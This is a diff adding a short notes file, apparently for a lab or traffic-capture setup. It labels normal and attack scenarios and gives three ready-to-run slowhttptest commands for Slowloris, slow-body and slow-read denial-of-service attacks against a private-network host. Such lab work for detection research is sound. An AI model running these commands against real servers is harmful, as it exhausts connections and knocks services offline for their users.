@@ -1,0 +1,14 @@
+noraml：
+
+noramlshort：
+
+attack： Slowloris，慢速发送 HTTP 头部（不发完），占用连接（1000-800-500）
+ 	slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://192.168.254.142:8080 -x 24 -p 3
+
+attackbody：slowHTTPtest，建立完整连接，慢速发送 请求体（Content-Length 很大）
+	slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.254.142:8080 -x 10 -p 3
+
+attackread：HTTPread
+       slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://192.168.254.142:8080
+
+mix：noraml+  Slowloris（1000-800-500）
